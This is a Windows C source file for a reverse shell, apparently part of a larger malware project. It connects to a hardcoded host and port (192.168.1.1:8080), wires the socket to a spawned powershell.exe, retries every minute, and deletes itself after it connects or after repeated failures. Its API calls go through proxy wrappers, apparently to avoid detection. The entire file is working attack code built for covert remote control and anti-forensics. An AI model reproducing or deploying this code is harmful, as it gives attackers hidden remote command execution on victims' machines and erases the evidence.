//  gcc .\reverse.c -o .\reverse.exe -lws2_32
#include <winsock2.h>
#include <stdio.h>
// #pragma comment(lib,"ws2_32")

#include "proxy_funck.c"
#include "proto_func.h"

int Reverse_Shell()
{
    STARTUPINFO ini_processo;
    PROCESS_INFORMATION processo_info;

    WSADATA wsaData;
    SOCKET Winsock;
    struct sockaddr_in hax; 

    char ip_addr_utka[] = "192.168.1.1"; 
    char port_utka[] = "8080";

    for (int i=0;;i++){

        ProxyWSAStartup(MAKEWORD(2, 2), &wsaData);
        Winsock = ProxyWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

        struct hostent *host; 
        host = Proxy_gethostbyname(ip_addr_utka);
        strcpy_s(ip_addr_utka, 16, Proxy_inet_ntoa(*((struct in_addr *)host->h_addr)));

        hax.sin_family = AF_INET;
        hax.sin_port = Proxy_htons(Proxy_atoi(port_utka));
        hax.sin_addr.s_addr = Proxy_inet_addr(ip_addr_utka);

        int result;
        result = Proxy_WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

        if (result != -1) {

            Proxy_memset(&ini_processo, 0, sizeof(ini_processo));
            ini_processo.cb = sizeof(ini_processo);
            ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
            ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

            // TCHAR cmd[255] = TEXT("powershell.exe");
            char cmd_utka[] = "powershell.exe";

            ProxyCreateProcessA(NULL, cmd_utka, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

            SelfDestruction();                      // После того как произошло подлкючение по reverse shell, удаляем файл

            }
        else
            ProxySleep(60000);
            
            if (i > 9) {
                SelfDestruction();                  // Так же если прошло больше n попыток подключения, удаляем файл
            }
    }
    
    return 0;
}